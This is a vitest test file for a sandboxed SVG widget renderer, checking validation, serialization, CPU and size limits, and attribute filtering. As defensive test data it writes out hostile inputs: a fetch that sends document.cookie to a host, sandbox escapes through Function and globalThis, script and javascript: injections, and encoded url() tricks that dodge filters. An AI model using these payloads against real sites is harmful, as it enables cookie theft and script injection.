import { describe, expect, it } from 'vitest';
import { parseWidget } from './parse.ts';
import { rasterise } from './raster.ts';
import { renderWidget, WIDGET_TOKENS, type WidgetRow } from './render.ts';
import { runWidget } from './run.ts';
import { serializeSvg, withLabels } from './serialize.ts';
import { validateWidget } from './validate.ts';
import { isWidgetAttributeValue } from '@polygonlabs/primer-api-types';
import { HOSTILE_VALUES } from './hostile.testlib.ts';

const FLOW = `export default function render({ tokens }) {
  const box = (x, label) => <rect x={x} y="40" width="140" height="48" rx="8" fill="none" stroke={tokens.axis} strokeWidth="1.25" />;
  return (
    <svg viewBox="0 0 520 120" role="img" aria-label="Review before merge">
      <g data-anchor="step-write">{box(20)}<text data-text-id="write" x="90" y="68" textAnchor="middle" fill={tokens.fg}>Write</text></g>
      <g data-anchor="step-review">{box(190)}<text data-text-id="review" x="260" y="68" textAnchor="middle" fill={tokens.fg}>Review</text></g>
      <g data-anchor="step-merge">{box(360)}<text data-text-id="merge" x="430" y="68" textAnchor="middle" fill={tokens.fg}>Merge</text></g>
    </svg>
  );
}`;

const BARS = `export default function render({ rows, tokens }) {
  const max = Math.max(...rows.map((r) => r.value));
  return (
    <svg viewBox="0 0 400 200">
      <text data-text-id="title" x="16" y="24" fill={tokens.fg}>Signups by week</text>
      {rows.map((r, i) => (
        <rect data-row={r.id} data-col="value" x={20 + i * 60} y={180 - (r.value / max) * 120} width="40" height={(r.value / max) * 120} fill={tokens.accent1} />
      ))}
    </svg>
  );
}`;
const ROWS: WidgetRow[] = [
  { id: 'w1', week: 'W1', value: 240 },
  { id: 'w2', week: 'W2', value: 310 },
];

const errorsOf = (result: object) => ('errors' in result ? (result.errors as { message: string }[]).map((e) => e.message).join('\n') : '');

describe('widget modules', () => {
  it('compiles JSX in place and keeps line numbers', () => {
    const { code } = parseWidget(FLOW);
    expect(code.split('\n')).toHaveLength(FLOW.split('\n').length);
    expect(code).toContain('const __render = function render');
    expect(code).toContain('__h("svg", {');
  });

  it('a parenthesized default export keeps its parens and renders', async () => {
    const source = 'export default (function render() { return <svg viewBox="0 0 10 10"><rect width="5" height="5" fill="none" /></svg>; });';
    expect(parseWidget(source).code).toContain('const __render = (function render()');
    expect(errorsOf(await renderWidget(source, [], 'light'))).toBe('');
  });

  it('renders a flowchart and a bar chart in both themes', async () => {
    const flow = await renderWidget(FLOW, [], 'light');
    expect(errorsOf(flow)).toBe('');
    if ('errors' in flow) return;
    expect(flow.labels).toEqual({ write: 'Write', review: 'Review', merge: 'Merge' });
    expect(flow.svg).toContain('stroke-width="1.25"');
    expect(flow.svg).toContain(`stroke="${WIDGET_TOKENS.light.axis}"`);

    const dark = await renderWidget(BARS, ROWS, 'dark');
    expect(errorsOf(dark)).toBe('');
    if ('errors' in dark) return;
    expect(dark.svg).toContain(`fill="${WIDGET_TOKENS.dark.accent1}"`);
    expect(dark.svg).toContain('data-row="w2" data-col="value"');

    const png = await rasterise(withLabels(flow.svg, { review: 'Code review' }), 'light');
    expect(png.subarray(1, 4).toString()).toBe('PNG');
    expect(png.readUInt32BE(16)).toBe(520); // 1× the viewBox width
  });

  it('computed text ids are rejected', () => {
    const result = validateWidget(`export default function render({ rows, tokens }) {
  return <svg viewBox="0 0 10 10">{rows.map((r) => <text data-text-id={r.id} fill={tokens.fg}>{r.name}</text>)}</svg>;
}`);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.errors[0]).toMatchObject({ line: 2, message: expect.stringContaining('literal name') });
  });

  it('typed words need a literal id, and an id holds only typed words', () => {
    const result = validateWidget(`<svg viewBox="0 0 10 10">
  <text fill={tokens.fg}>Untitled</text>
  <text data-text-id="total" fill={tokens.fg}>Total: {rows.length}</text>
  <text data-text-id="two" fill={tokens.fg}><tspan>a</tspan></text>
</svg>`);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.errors.map((e) => e.line)).toEqual([2, 3, 4, 4]); // the <tspan> also lacks an id
    expect(result.errors[0]!.message).toContain('no data-text-id');
  });

  it('fetch and imports are rejected', () => {
    const result = validateWidget(`import x from 'evil';
export default function render({ tokens }) {
  fetch('https://example.com/?' + document.cookie);
  const f = Function('return this')();
  globalThis.y = import('evil');
  return <svg viewBox="0 0 10 10" style="fill:red"><foreignObject /><style>{'*{}'}</style><rect fill="#ff0000" onClick="x()" /></svg>;
}`);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    const messages = result.errors.map((e) => `${e.line} ${e.message}`).join('\n');
    expect(messages).toContain('1 Widgets have no imports');
    expect(messages).toContain('3 `fetch` is not available');
    expect(messages).toContain('4 `Function` is not available');
    expect(messages).toContain('5 `globalThis` is not available');
    expect(messages).toContain('The `style` attribute is not allowed');
    expect(messages).toContain('<foreignObject> is not an element');
    expect(messages).toContain('<style> is not an element');
    expect(messages).toContain('Literal colour "#ff0000"');
    expect(messages).toContain('Event handlers are not allowed');
  });

  it('serializer drops script, event handlers and external hrefs', () => {
    const tree = {
      t: 'svg',
      p: { viewBox: '0 0 10 10', onload: 'alert(1)' },
      c: [
        { t: 'script', p: {}, c: ['alert(1)'] },
        { t: 'use', p: { href: 'https://example.com/sprite.svg#x' }, c: [] },
        { t: 'use', p: { href: '#dot' }, c: [] },
        { t: 'a', p: { href: 'javascript:alert(1)' }, c: [{ t: 'rect', p: { onclick: 'x()' }, c: [] }] },
        { t: 'rect', p: { id: 'dot', fill: 'url(#grad)', 'data-x': '1' }, c: [] },
      ],
    };
    const out = serializeSvg(tree, { colours: new Set(), rows: new Map(), textIds: new Set(), idPrefix: 'wg1-' });
    expect(errorsOf(out)).toBe('');
    if ('errors' in out) return;
    expect(out.svg).toBe(
      '<svg xmlns="http://www.w3.org/2000/svg" font-family="Roboto, Helvetica, Arial, sans-serif" viewBox="0 0 10 10"><use></use><use href="#wg1-dot"></use><rect id="wg1-dot" fill="url(#wg1-grad)"></rect></svg>',
    );
    expect(out.warnings).toEqual(expect.arrayContaining(['dropped onload on <svg>', 'dropped <script>', 'dropped <a>', 'dropped an external href on <use>']));
  });

  it('infinite loop is stopped by the CPU limit', async () => {
    const started = Date.now();
    const out = await renderWidget(`export default function render() {
  while (true) {}
}`, [], 'light');
    expect(Date.now() - started).toBeLessThan(2000);
    expect(errorsOf(out)).toContain('longer than 50 ms');
  });

  it('a tree over 5,000 nodes is refused before rasterising', async () => {
    const source = `export default function render({ tokens }) {
  return <svg viewBox="0 0 100 100">{Array.from({ length: 6000 }, (_, i) => <rect x={i} width="1" height="1" fill={tokens.fg} />)}</svg>;
}`;
    expect(errorsOf(await renderWidget(source, [], 'light'))).toContain('more than 5000 elements');
    // The serializer bounds nodes too, whatever produced the tree.
    const tree = { t: 'svg', p: { viewBox: '0 0 1 1' }, c: Array.from({ length: 5001 }, () => 'x') };
    expect(errorsOf(serializeSvg(tree, { colours: new Set(), rows: new Map(), textIds: new Set(), idPrefix: '' }))).toContain('more than 5000 nodes');
  });

  it('an output with a computed style is refused at runtime even if the source passed', async () => {
    const source = `export default function render({ tokens }) {
  const k = ['sty', 'le'].join('');
  const evil = { [k]: 'fill: url(https://example.com/x)' };
  const fo = ['foreign', 'Object'].join('');
  const leak = { mask: 'url(https://example.com/m.svg#a)', filter: 'url( #x ) url(https://example.com/f)' };
  const sneaky = { mask: 'URL(https://example.com/a)', filter: 'url (https://example.com/b)', 'clip-path': '\\\\75 rl(https://example.com/c)', 'marker-end': '&#117;rl(https://example.com/d)' };
  return <svg viewBox="0 0 10 10"><rect {...evil} fill={tokens.fg} /><rect {...leak} /><rect {...sneaky} />{__h(fo, null)}</svg>;
}`;
    expect(validateWidget(source)).toEqual({ ok: true });
    const out = await renderWidget(source, [], 'light');
    expect(errorsOf(out)).toContain('has a style attribute');
    expect(errorsOf(out)).toContain('<foreignObject> is not an element');
    expect(errorsOf(out)).toContain('mask on <rect> has "url(https://example.com/m.svg#a)"');
    expect(errorsOf(out)).toContain('filter on <rect> has "url( #x ) url(https://example.com/f)"');
    for (const v of ['URL(https://example.com/a)', 'url (https://example.com/b)', '\\75 rl(https://example.com/c)', '&#117;rl(https://example.com/d)']) {
      expect(errorsOf(out)).toContain(`has "${v}"`);
    }
  });

  it('runtime refuses literal colours, copied text ids and unknown rows the source hid', async () => {
    const source = `export default function render({ rows }) {
  const c = ['#', 'f00'].join('');
  const id = ['ti', 'tle'].join('');
  return <svg viewBox="0 0 10 10"><rect fill={c} />{[1, 2].map(() => <text data-text-id="title">Hi</text>)}<rect {...{ 'data-text-id': id }} /><rect data-row="nope" /></svg>;
}`;
    expect(validateWidget(source)).toEqual({ ok: true });
    const errors = errorsOf(await renderWidget(source, ROWS, 'light'));
    expect(errors).toContain('fill="#f00" on <rect> is not a theme token');
    expect(errors).toContain('data-text-id="title" is drawn more than once');
    expect(errors).toContain('data-row="nope" names no row');
  });

  it('the sandbox has no clock, no random and no host', async () => {
    const run = (body: string) => runWidget(`const __render = () => { ${body} };`, { rows: [], tokens: {} });
    expect(errorsOf(await run('return Math.random();'))).toContain('Math.random is not available');
    expect(errorsOf(await run('return new Date().getTime();'))).toContain('reads the clock');
    expect(errorsOf(await run('return typeof fetch + typeof require + typeof process;'))).toBe('');
    expect(await run('return [typeof fetch, typeof require, typeof process, typeof console].join();')).toEqual({
      tree: 'undefined,undefined,undefined,undefined',
    });
  });

  it('a 100k-digit transform is refused at once', () => {
    const value = `translate(${'1'.repeat(100_000)}x)`;
    const started = performance.now();
    expect(isWidgetAttributeValue('transform', value)).toBe(false);
    expect(isWidgetAttributeValue('transform', `translate(${'1'.repeat(200)}x)`)).toBe(false);
    expect(performance.now() - started).toBeLessThan(50);
  });

  it('every hostile attribute value is refused, and good ones pass', () => {
    for (const [name, value] of HOSTILE_VALUES) {
      expect(isWidgetAttributeValue(name, value), `${name}="${value}"`).toBe(false);
      const out = serializeSvg({ t: 'svg', p: { viewBox: '0 0 1 1' }, c: [{ t: 'rect', p: { [name]: value }, c: [] }] }, { colours: new Set(), rows: new Map([['a\\62 c', { id: 'x' }]]), textIds: new Set(), idPrefix: '' });
      // Refused, or dropped where the tag doesn't take the attribute at all.
      expect('errors' in out || !out.svg.includes(` ${name}=`), `${name}="${value}"`).toBe(true);
    }
    for (const [name, value] of [['mask', 'url(#m)'], ['marker-end', 'none'], ['fill', '#1f2328'], ['transform', 'translate(10, 20) rotate(-45) scale(1.5e0)'], ['d', 'M0 0L10 10z']]) {
      expect(isWidgetAttributeValue(name!, value!), `${name}="${value}"`).toBe(true);
    }
  });
});
